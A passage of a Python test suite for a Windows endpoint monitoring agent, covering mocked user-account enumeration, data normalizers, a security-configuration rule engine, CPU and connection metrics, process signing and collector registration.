        security.ConvertStringSidToSid.return_value = "S-1-5-32-544"
        security.LookupAccountSid.return_value = ("Administrators", "BUILTIN", 4)
        return net, constants, security

    def test_native_accounts_admin_last_logon_and_lock_flags(self):
        from agent.os.windows.collectors.system import _native_local_users

        net, constants, security = self._apis()
        net.NetLocalGroupGetMembers.return_value = (
            [{"domainandname": "DESKTOP\\Alice"}], 1, 0,
        )
        net.NetUserEnum.return_value = ([
            {"name": "Alice", "flags": 0, "last_logon": 1700000000,
             "home_dir": "D:\\Profiles\\Alice"},
            {"name": "Guest", "flags": 0x0002, "last_logon": 0,
             "home_dir": ""},
            {"name": "Locked", "flags": 0x0010, "last_logon": 0,
             "home_dir": ""},
        ], 3, 0)

        rows = _native_local_users(net, constants, security)
        assert rows[0]["admin"] is True
        assert rows[0]["last_login"] == 1700000000
        assert rows[0]["home"] == "D:\\Profiles\\Alice"
        assert rows[1]["locked"] is True
        assert rows[1]["last_login"] is None
        assert rows[1]["home"] == "C:\\Users\\Guest"
        assert rows[2]["locked"] is True
        security.LookupAccountSid.assert_called_once()

    def test_netapi_pagination_is_drained(self):
        from agent.os.windows.collectors.system import _paged_net_call

        api_call = MagicMock(side_effect=[
            ([{"name": "one"}], 2, 123),
            ([{"name": "two"}], 2, 0),
        ])
        assert _paged_net_call(api_call, None, 3, 2) == [
            {"name": "one"}, {"name": "two"},
        ]
        assert api_call.call_args_list == [call(None, 3, 2, 0), call(None, 3, 2, 123)]

    def test_collector_never_uses_powershell_or_net_command(self):
        from agent.os.windows.collectors.system import UsersCollector

        collector = UsersCollector()
        expected = [{"name": "Alice", "last_login": 10}]
        with patch(
            "agent.os.windows.collectors.system._native_local_users",
            return_value=expected,
        ), patch("psutil.users", return_value=[]), patch.object(
            collector, "_run", side_effect=AssertionError("subprocess forbidden")
        ), patch.object(
            collector, "_run_ps", side_effect=AssertionError("PowerShell forbidden")
        ):
            assert collector.collect() == expected


# ═══════════════════════════════════════════════════════════════════════════════
# 14. Normalizer coverage — sections not in test_windows_normalizer.py
# ═══════════════════════════════════════════════════════════════════════════════

class TestNormalizerAdditional:
    def _n(self, section, raw):
        from agent.os.windows.normalizer import normalize
        return normalize(section, raw)

    # hardware
    def test_hardware_record(self):
        raw = [{"bus": "usb", "name": "Logitech Mouse", "vendor": "Logitech",
                "product_id": "C52F", "vendor_id": "046D", "serial": None,
                "connected": True}]
        out = self._n("hardware", raw)
        assert out[0]["connected"] is True
        assert out[0]["vendor"] == "Logitech"

    def test_hardware_empty_list(self):
        assert self._n("hardware", []) == []

    # containers
    def test_container_id_truncated(self):
        raw = [{"id": "abcdef1234567890", "name": "web", "image": "nginx",
                "status": "running", "runtime": "docker",
                "ports": ["80/tcp"], "created_at": 1700000000}]
        out = self._n("containers", raw)
        assert len(out[0]["id"]) == 12   # truncated to 12

    def test_container_status_lowercased(self):
        raw = [{"id": "abc", "name": "db", "image": "postgres",
                "status": "RUNNING", "runtime": "docker",
                "ports": [], "created_at": None}]
        out = self._n("containers", raw)
        assert out[0]["status"] == "running"

    # battery
    def test_battery_present(self):
        raw = {"present": True, "charging": True, "charge_pct": 80,
               "cycle_count": None, "condition": "Normal",
               "capacity_mah": 5000, "design_mah": 5100, "voltage_mv": 12000}
        out = self._n("battery", raw)
        assert out["present"] is True
        assert out["charge_pct"] == 80

    def test_battery_bool_coercion(self):
        raw = {"present": 1, "charging": "true", "charge_pct": None}
        out = self._n("battery", raw)
        assert out["present"] is True
        assert out["charging"] is True

    # openfiles
    def test_openfiles_record(self):
        raw = [{"pid": 500, "process": "explorer.exe", "fd_count": 300, "user": "Alice"}]
        out = self._n("openfiles", raw)
        assert out[0]["fd_count"] == 300
        assert out[0]["process"] == "explorer.exe"

    # mounts
    def test_mounts_record(self):
        raw = [{"device": "C:\\", "mountpoint": "C:\\", "fstype": "NTFS", "options": "rw"}]
        out = self._n("mounts", raw)
        assert out[0]["device"] == "C:\\"

    # arp
    def test_arp_record(self):
        raw = [{"ip": "192.168.1.1", "mac": "aa:bb:cc:dd:ee:ff",
                "interface": "eth0", "state": "dynamic"}]
        out = self._n("arp", raw)
        assert out[0]["mac"] == "aa:bb:cc:dd:ee:ff"

    def test_arp_missing_ip_skipped(self):
        raw = [{"ip": "", "mac": "aa:bb:cc:dd:ee:ff", "interface": "eth0", "state": "dynamic"}]
        out = self._n("arp", raw)
        assert out == []

    # configs
    def test_configs_record(self):
        raw = [{"path": r"C:\Windows\System32\drivers\etc\hosts",
                "type": "hosts", "hash": "abc123", "size_bytes": 824,
                "modified_at": 1700000000, "suspicious": False, "note": None}]
        out = self._n("configs", raw)
        assert out[0]["path"] == r"C:\Windows\System32\drivers\etc\hosts"
        assert out[0]["owner"] is None      # Windows — no getpwuid
        assert out[0]["permissions"] is None

    def test_configs_empty_path_skipped(self):
        raw = [{"path": "", "type": "hosts", "hash": None}]
        out = self._n("configs", raw)
        assert out == []

    # binaries
    def test_binaries_record(self):
        raw = [{"path": r"C:\Windows\System32\cmd.exe",
                "name": "cmd.exe", "hash_sha256": "deadbeef",
                "size_bytes": 100000, "modified_at": 1700000000,
                "signed": None}]
        out = self._n("binaries", raw)
        assert out[0]["suid"] is None         # UNIX concept
        assert out[0]["world_writable"] is None

    # services — start/stop pending → unknown
    def test_services_transitional_state(self):
        raw = [{"name": "WinHTTPAutoProxySvc", "status": "start_pending",
                "enabled": True, "pid": None, "type": "winsvc", "description": None}]
        out = self._n("services", raw)
        assert out[0]["status"] == "unknown"

    # users — shell and uid always None
    def test_users_no_unix_fields(self):
        raw = [{"name": "Bob", "uid": None, "gid": None, "shell": None,
                "home": r"C:\Users\Bob", "last_login": None,
                "admin": False, "locked": False}]
        out = self._n("users", raw)
        assert out[0]["shell"] is None
        assert out[0]["uid"] is None


# ═══════════════════════════════════════════════════════════════════════════════
# 15. Importability — all Windows modules importable on non-Windows
# ═══════════════════════════════════════════════════════════════════════════════

class TestImportability:
    """Verify that no Windows module raises at import time on macOS/Linux."""

    def test_normalizer_importable(self):
        import agent.os.windows.normalizer  # noqa: F401

    def test_keystore_importable(self):
        import agent.os.windows.keystore  # noqa: F401

    def test_collectors_base_importable(self):
        import agent.os.windows.collectors.base  # noqa: F401

    def test_collectors_volatile_importable(self):
        import agent.os.windows.collectors.volatile  # noqa: F401

    def test_collectors_network_importable(self):
        import agent.os.windows.collectors.network  # noqa: F401

    def test_collectors_system_importable(self):
        import agent.os.windows.collectors.system  # noqa: F401

    def test_collectors_posture_importable(self):
        import agent.os.windows.collectors.posture  # noqa: F401

    def test_collectors_inventory_importable(self):
        import agent.os.windows.collectors.inventory  # noqa: F401

    def test_service_importable(self):
        import agent.os.windows.service  # noqa: F401

    def test_watchdog_svc_importable(self):
        import agent.os.windows.watchdog_svc  # noqa: F401


# ═══════════════════════════════════════════════════════════════════════════════
# 15. ScaEngine — rule grammar, condition logic, policy loading (mock runner)
# ═══════════════════════════════════════════════════════════════════════════════

class TestScaEngine:
    """SCA engine evaluation is OS-agnostic and driven by an injected runner."""

    def _engine(self, responses, rules, condition="all"):
        from agent.os.windows.sca.engine import ScaEngine

        def runner(cmd, timeout):
            return responses.get(cmd, (1, ""))

        pol = {"id": "t", "name": "t",
               "checks": [{"id": "c", "title": "c",
                           "condition": condition, "rules": rules}]}
        return ScaEngine(runner=runner, bundled_policies=[pol])

    def _result(self, responses, rules, condition="all"):
        eng = self._engine(responses, rules, condition)
        return eng.scan()["policies"][0]["checks"][0]["result"]

    def test_regex_matcher_pass_and_fail(self):
        r = {"cmd": (0, "value is 1")}
        assert self._result(r, [r"c:cmd -> r:value is 1"]) == "pass"
        assert self._result(r, [r"c:cmd -> r:value is 9"]) == "fail"

    def test_negated_matcher(self):
        r = {"cmd": (0, "value is 0")}
        assert self._result(r, [r"c:cmd -> !r:value is 1"]) == "pass"

    def test_numeric_compare(self):
        r = {"cmd": (0, "Days: 12")}
        assert self._result(r, [r"c:cmd -> n:Days: (\d+) compare <= 45"]) == "pass"
        assert self._result(r, [r"c:cmd -> n:Days: (\d+) compare > 45"]) == "fail"

    def test_literal_substring(self):
        assert self._result({"cmd": (0, "value is 1")}, [r"c:cmd -> value is"]) == "pass"

    def test_exit_code_only(self):
        assert self._result({"cmd": (0, "")}, [r"c:cmd"]) == "pass"
        assert self._result({"cmd": (1, "")}, [r"c:cmd"]) == "fail"

    def test_condition_any(self):
        r = {"a": (0, "no"), "b": (0, "yes")}
        assert self._result(r, [r"c:a -> r:yes", r"c:b -> r:yes"], "any") == "pass"

    def test_condition_none(self):
        assert self._result({"c": (0, "clean")}, [r"c:c -> r:bad"], "none") == "pass"
        assert self._result({"c": (0, "bad")},   [r"c:c -> r:bad"], "none") == "fail"

    def test_execution_error_is_tri_state(self):
        # runner returns rc=None → engine reports 'error', not 'fail'
        assert self._result({"c": (None, "")}, [r"c:c -> r:x"], "all") == "error"

    def test_not_rule_prefix(self):
        assert self._result({"c": (0, "value is 0")},
                            [r"not c:c -> r:value is 1"], "all") == "pass"

    def test_file_rule_missing(self):
        assert self._result({}, [r"f:Z:\definitely\missing\path"], "all") == "fail"

    def test_summary_score(self):
        from agent.os.windows.sca.engine import ScaEngine

        def runner(cmd, timeout):
            return {"ok": (0, "1"), "bad": (0, "0")}.get(cmd, (1, ""))

        pol = {"id": "p", "name": "p", "checks": [
            {"id": "1", "title": "1", "rules": [r"c:ok -> r:1"]},
            {"id": "2", "title": "2", "rules": [r"c:bad -> r:1"]},
        ]}
        out = ScaEngine(runner=runner, bundled_policies=[pol]).scan()
        s = out["summary"]
        assert s["total"] == 2 and s["pass"] == 1 and s["fail"] == 1
        assert s["score_pct"] == 50.0

    def test_bundled_policy_has_checks(self):
        from agent.os.windows.sca import BUNDLED_POLICIES
        assert BUNDLED_POLICIES and BUNDLED_POLICIES[0]["checks"]
        for chk in BUNDLED_POLICIES[0]["checks"]:
            assert chk["id"] and chk["title"] and chk["rules"]
            assert chk.get("condition", "all") in ("all", "any", "none")

    def test_platform_filter_excludes_non_windows(self):
        from agent.os.windows.sca.engine import ScaEngine
        pol = {"id": "lin", "name": "lin", "platform": ["linux"],
               "checks": [{"id": "x", "title": "x", "rules": [r"c:whatever"]}]}
        out = ScaEngine(runner=lambda c, t: (0, ""),
                        bundled_policies=[pol], platform="windows").scan()
        assert out["policies"] == []


class TestScaCollector:
    """Collector wiring: tokenizer, registration, never-raise contract."""

    def test_tokenizer_preserves_backslashes_and_quotes(self):
        from agent.os.windows.collectors.sca import _tokenize
        toks = _tokenize(r'reg query "HKLM\Windows NT\x" /v Name')
        assert toks == ["reg", "query", r"HKLM\Windows NT\x", "/v", "Name"]

    def test_tokenizer_mid_token_quote(self):
        from agent.os.windows.collectors.sca import _tokenize
        toks = _tokenize(r'auditpol /get /category:"Logon/Logoff"')
        assert toks == ["auditpol", "/get", "/category:Logon/Logoff"]

    def test_collect_never_raises_returns_dict(self):
        # Force the runner to error on every command; collect() must still
        # return a well-formed dict with all checks marked (never raise).
        import agent.os.windows.collectors.sca as sca_mod
        with patch.object(sca_mod, "_route_command", return_value=(None, "")):
            out = sca_mod.ScaCollector().collect()
        assert isinstance(out, dict)
        assert "policies" in out and "summary" in out

    def test_registered_in_collectors(self):
        from agent.os.windows.collectors import COLLECTORS
        assert "sca" in COLLECTORS

    def test_normalizer_handles_sca(self):
        from agent.os.windows.normalizer import normalize
        raw = {"policies": [{"policy_id": "p", "policy_name": "P",
                             "checks": [{"id": "1", "title": "t", "result": "pass"}],
                             "summary": {"total": 1, "pass": 1}}],
               "summary": {"total": 1, "pass": 1, "fail": 0,
                           "not_applicable": 0, "error": 0, "score_pct": 100.0}}
        out = normalize("sca", raw)
        assert out["summary"]["pass"] == 1
        assert out["policies"][0]["checks"][0]["result"] == "pass"

    def test_sca_module_importable(self):
        import agent.os.windows.collectors.sca  # noqa: F401
        import agent.os.windows.sca             # noqa: F401


# ═══════════════════════════════════════════════════════════════════════════════
# 16. Volatile enhancements — per-core CPU, connection direction/service, signing
# ═══════════════════════════════════════════════════════════════════════════════

class TestMetricsPerCore:
    def test_cpu_per_core_present(self):
        import agent.os.windows.collectors.volatile as vol
        fake = MagicMock()
        fake.cpu_percent.return_value = [10.0, 20.0, 30.0, 40.0]
        fake.cpu_count.return_value = 4
        fake.virtual_memory.return_value = SimpleNamespace(
            percent=50.0, used=8 * 1024**3, total=16 * 1024**3)
        fake.swap_memory.return_value = SimpleNamespace(percent=0.0, used=0, total=0)
        fake.boot_time.return_value = time.time() - 100
        fake.disk_io_counters.return_value = None
        fake.net_io_counters.return_value = None
        fake.cpu_freq.return_value = None
        with patch.object(vol, "psutil", fake):
            out = vol.MetricsCollector().collect()
        assert out["cpu_per_core"] == [10.0, 20.0, 30.0, 40.0]
        # aggregate is the mean of the per-core sample
        assert out["cpu_pct"] == 25.0

    def test_normalizer_coerces_per_core(self):
        from agent.os.windows.normalizer import normalize
        out = normalize("metrics", {"cpu_pct": 5, "cpu_per_core": ["1.5", 2, "bad"]})
        assert out["cpu_per_core"] == [1.5, 2.0, 0.0]


class TestConnectionDirection:
    def _sock(self, ip, port, status, stype=1, raddr=None, pid=1):
        return SimpleNamespace(
            family="AF_INET", type=stype, status=status, pid=pid,
            laddr=SimpleNamespace(ip=ip, port=port),
            raddr=(SimpleNamespace(ip=raddr[0], port=raddr[1]) if raddr else ()),
        )

    def test_direction_inbound_outbound_listen(self):
        import agent.os.windows.collectors.volatile as vol
        fake = MagicMock()
        fake.CONN_LISTEN = "LISTEN"
        fake.process_iter.return_value = []
        socks = [
            self._sock("0.0.0.0", 443, "LISTEN"),                       # listen
            self._sock("10.0.0.5", 443, "ESTABLISHED", raddr=("1.2.3.4", 55000)),  # inbound (443 is listening)
            self._sock("10.0.0.5", 51000, "ESTABLISHED", raddr=("1.2.3.4", 443)),  # outbound
            self._sock("0.0.0.0", 53, "NONE", stype=2),                # udp bound
        ]
        fake.net_connections.return_value = socks
        with patch.object(vol, "psutil", fake):
            rows = vol.ConnectionsCollector().collect()
        # key on (port, state) since a listener and a live conn can share a port
        by = {(r["local_port"], r["state"]): r for r in rows}
        listen = by[(443, "LISTEN")]
        assert listen["direction"] == "listen" and listen["service"] == "https"
        est_in = by[(443, "ESTABLISHED")]
        assert est_in["direction"] == "inbound"
        assert by[(51000, "ESTABLISHED")]["direction"] == "outbound"
        udp = by[(53, "NONE")]
        assert udp["proto"] == "udp" and udp["direction"] is None and udp["service"] == "dns"

    def test_normalizer_carries_direction_service(self):
        from agent.os.windows.normalizer import normalize
        out = normalize("connections", [{"proto": "tcp", "local_port": 443,
                                          "direction": "inbound", "service": "https"}])
        assert out[0]["direction"] == "inbound" and out[0]["service"] == "https"


class TestProcessSigning:
    def test_signed_field_added_and_exe_dropped(self):
        import agent.os.windows.collectors.volatile as vol
        proc = SimpleNamespace(pid=100, info={
            "pid": 100, "ppid": 1, "name": "svc.exe", "username": "SYSTEM",
            "cpu_percent": 5.0, "memory_percent": 1.0,
            "memory_info": SimpleNamespace(rss=1024 * 1024),
            "status": "running", "create_time": 0, "cmdline": ["svc.exe"],
            "exe": r"C:\Windows\System32\svc.exe",
        })
        fake = MagicMock()
        fake.process_iter.return_value = [proc]
        fake.NoSuchProcess = Exception
        fake.AccessDenied = Exception
        with patch.object(vol, "psutil", fake), \
             patch.object(vol, "_authenticode_status", return_value="signed") as sig:
            rows = vol.ProcessesCollector().collect()
        assert rows[0]["signed"] == "signed"
        assert "_exe" not in rows[0]
        sig.assert_called_once_with(r"C:\Windows\System32\svc.exe")

    def test_authenticode_none_off_windows(self):
        import agent.os.windows.collectors.volatile as vol
        with patch.object(vol.sys, "platform", "linux"):
            assert vol._authenticode_status(r"C:\x.exe") is None
        assert vol._authenticode_status(None) is None

    def test_normalizer_carries_signed(self):
        from agent.os.windows.normalizer import normalize
        out = normalize("processes", [{"pid": 1, "name": "a", "signed": "unsigned"}])
        assert out[0]["signed"] == "unsigned"


# ═══════════════════════════════════════════════════════════════════════════════
# 17. win_agent SCA wiring — regression guard
#
# win_agent.py has its OWN collector list + interval table, separate from the
# collectors/__init__.py COLLECTORS registry. A collector missing here never
# runs in the shipped Windows agent even if registered elsewhere.
# ═══════════════════════════════════════════════════════════════════════════════

class TestWinAgentScaWiring:
    def _agent(self):
        from agent.os.windows.win_agent import WindowsAgent
        cfg = {
            "agent": {"id": "t", "name": "t"},
            "manager": {"url": "https://x", "api_key": "a" * 64},
            "paths": {
                "security_dir": "x", "spool_dir": "x", "log_dir": "x",
                "data_dir": "x",
            },
            "collection": {"sections": {}},
        }
        return WindowsAgent(cfg)

    def test_sca_in_interval_table(self):
        from agent.os.windows.win_agent import _INTERVALS
        assert "sca" in _INTERVALS, "win_agent._INTERVALS must include 'sca' or it never schedules"

    def test_sca_scheduled_and_loaded(self):
        a = self._agent()
        assert "sca" in a._active_intervals
        a._load_collectors()
        assert "sca" in a._collectors
        assert type(a._collectors["sca"]).__name__ == "ScaCollector"

    def test_win_agent_loads_all_registry_collectors(self):
        # Every section in the shared COLLECTORS registry must also be loadable by
        # win_agent, so nothing is registered-but-never-run in the shipped binary.
        from agent.os.windows.collectors import COLLECTORS
        a = self._agent()
        a._load_collectors()
        missing = set(COLLECTORS) - set(a._collectors)
        assert not missing, f"win_agent does not load registry collectors: {missing}"


def test_windows_registry_does_not_eagerly_construct_stateful_collectors():
    from agent.os.windows.collectors import COLLECTORS

    # Test discovery and diagnostics must not touch protected ProgramData.
    assert len(COLLECTORS) >= 25
    assert "eventlog" in COLLECTORS
    assert "eventlog" not in COLLECTORS._instances
